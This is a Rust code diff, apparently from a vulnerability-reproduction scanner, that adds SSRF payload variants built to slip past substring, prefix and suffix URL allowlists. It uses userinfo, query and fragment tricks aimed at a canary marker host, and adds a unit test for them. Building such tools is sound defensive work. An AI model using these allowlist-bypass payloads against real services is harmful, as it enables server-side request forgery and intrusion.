@@ -1718,12 +1718,47 @@ fn payloads(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<(String, Signal)>
                 out.push((url, Signal::ServiceReached(token.clone())));
             }
             if let Some(url) = canary.public_service_url_for_token(&token) {
-                out.push((url, Signal::ServiceReached(token)));
+                out.push((url, Signal::ServiceReached(token.clone())));
+            }
+            // A handler that gates the URL on a substring/prefix allowlist (`url.includes("site.com")`)
+            // rejects each bare marker URL above before the sink. For every mined allow token, re-shape
+            // each marker URL so it carries the token where it cannot change the effective host (as URL
+            // userinfo, or in the path/query/fragment) and still lands at the marker. The bare URLs stay
+            // in the list so a mis-mined gate that does not actually block is still reproduced.
+            if !probe.allow_tokens.is_empty() {
+                let mut bypass = Vec::new();
+                for (base, signal) in &out {
+                    for allow in &probe.allow_tokens {
+                        for variant in allowlist_bypass_variants(base, allow) {
+                            bypass.push((variant, signal.clone()));
+                        }
+                    }
+                }
+                out.extend(bypass);
             }
             out
         }
         _ => Vec::new(),
     }
+}
+
+/// Variants of a marker URL that embed an allowlisted host substring the handler's URL gate requires
+/// (`url.includes("site.com")`, `url.startsWith("https://site.com")`) while keeping the marker as the
+/// effective host. Three placements cover the common substring/prefix allowlist shapes: the token as URL
+/// *userinfo* (`scheme://site.com@marker/...`, which still *begins* `scheme://site.com` and contains it),
+/// appended as a *query* parameter, and as a URL *fragment* (so a string that must *end* with the token
+/// does). Each keeps the probe token in the marker URL's path, so a hit is still attributed to this probe
+/// and tells this reproduction from the app's ordinary traffic.
+fn allowlist_bypass_variants(base: &str, token: &str) -> Vec<String> {
+    let mut out = Vec::new();
+    if let Some(pos) = base.find("://") {
+        let (scheme, rest) = base.split_at(pos + 3);
+        out.push(format!("{scheme}{}@{rest}", encode(token)));
+    }
+    let sep = if base.contains('?') { '&' } else { '?' };
+    out.push(format!("{base}{sep}jss_allow={}", encode(token)));
+    out.push(format!("{base}#{token}"));
+    out
 }
 
 /// Command-injection payloads shaped to the exact way the handler builds and transforms the shell
@@ -2606,6 +2641,7 @@ mod tests {
             nosql_inserts_before_sink: false,
             nosql_mutates: false,
             decode_base64: None,
+            allow_tokens: Vec::new(),
         }
     }
 
@@ -2913,6 +2949,38 @@ mod tests {
             a[0].body.as_deref(),
             Some("{\"url\":\"http://jss-marker/tok-0\"}")
         );
+    }
+
+    #[test]
+    fn a_substring_allowlisted_ssrf_carries_the_token_without_losing_the_marker_host() {
+        // The image-proxy shape: a query-sourced SSRF whose handler requires the URL to *contain*
+        // `google.com`. Each bypass variant must still land at the marker (carry the marker host and the
+        // probe token) while embedding the allow token, and the out-of-band signal is unchanged.
+        let canary = Canary::new("tok".to_owned());
+        let mut p = probe(VulnClass::Ssrf, "/api/proxy-image", Entry::Query("url".to_owned()));
+        p.allow_tokens = vec!["google.com".to_owned()];
+        let a = attempts(&p, &canary, 0);
+        // The userinfo variant keeps the marker as host and begins `http://google.com@`, so a substring
+        // *or* prefix allowlist passes and the request still reaches the marker carrying this token.
+        let userinfo = attempts_with_url(&a, "http://google.com@jss-marker/tok-0");
+        assert!(userinfo.is_some(), "no userinfo bypass variant in {a:?}");
+        assert_eq!(
+            userinfo.unwrap().signal,
+            Signal::ServiceReached("tok-0".to_owned())
+        );
+        // A query-carried and a fragment-carried variant also appear, covering substring and suffix
+        // allowlists. Every marker-bound attempt still carries the probe token.
+        assert!(attempts_with_url(&a, "http://jss-marker/tok-0?jss_allow=google.com").is_some());
+        assert!(attempts_with_url(&a, "http://jss-marker/tok-0#google.com").is_some());
+        // The bare marker URL stays, so a mis-mined gate that does not actually block still reproduces.
+        assert!(attempts_with_url(&a, "http://jss-marker/tok-0").is_some());
+    }
+
+    /// The attempt whose query carries `url` decoded to exactly `want` (the planner percent-encodes the
+    /// value into `?url=`, so compare against the decoded form).
+    fn attempts_with_url<'a>(attempts: &'a [Attempt], want: &str) -> Option<&'a Attempt> {
+        let needle = format!("url={}", encode(want));
+        attempts.iter().find(|a| a.target.contains(&needle))
     }
 
     #[test]
